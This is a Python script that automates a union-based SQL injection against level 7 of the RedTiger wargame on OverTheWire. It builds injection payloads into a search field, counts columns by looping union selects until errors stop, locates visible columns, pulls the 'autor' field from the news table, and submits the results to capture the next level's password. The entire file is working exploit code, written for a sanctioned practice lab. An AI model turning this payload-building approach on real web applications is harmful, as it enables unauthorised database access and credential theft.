#!/usr/bin/env python3
import pickle
import tigers as tg
import tiger_cookies
from connect import my_request as req


def main():
    '''
    Target: Get the name of the user who posted the news about google. 
    Table: level7_news column: autor
    Restrictions: no comments, no substr, no substring, no ascii, no mid, no like
    '''
    url = "https://redtiger.labs.overthewire.org/level7.php"
    base_name = 'level7_news'
    finds = ['autor']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level7login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level7login=cooks[level])

    # Search for error
    data = dict(search="google%'", dosearch='search!')
    response = req.post_request(url, data, cook)
    # print(response)

    # Counting the number of columns
    columns = 1
    response = 'An error occured!'
    while 'An error occured!' in response:
        list_of_columns = [str(c + 1) for c in range(columns)]
        p = f"google%') union select {','.join(list_of_columns)} FROM {base_name} news, level7_texts text where ('%'='"
        data = dict(search=p, dosearch='search!')
        response = req.post_request(url, data, cook)
        columns += 1

    print(list_of_columns)

    # Search for visible columns
    p = f"google%') UNION SELECT 1,2,3,4 FROM {base_name} news, level7_texts text where ('%'='"
    data = dict(search=p, dosearch='search!')
    #response = req.post_request(url, data, cook)
    # print(response)
    base_p = "google"
    num_columns = 4
    base_data = dict(search=base_p, dosearch='search!')
    list_of_visible, html_visible = tg.find_visible_columns(url, num_columns,
                                                            data, base_data,
                                                            cook, method='post')

    # Search for the desired data
    if len(finds) <= len(list_of_visible):
        for i, f in enumerate(finds):
            # Replace the displayed fields in list_of_columns with the desired parameters
            list_of_columns[int(list_of_visible[i]) - 1] = f
    else:
        print('too small visible list')
        exit(1)

    p = f"google%') UNION SELECT {','.join(list_of_columns)} FROM {base_name} news, level7_texts text where ('%'='"
    data = dict(search=p, dosearch='search!')
    keys = tg.find_param(url, len(finds), html_visible,
                         data, cook, method='post')

    for k in keys:
        # Authorization
        data = {'username': k, 'try': 'Check!'}
        response = req.post_request(url, data, cook)
        if 'flag' in response:
            break

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()





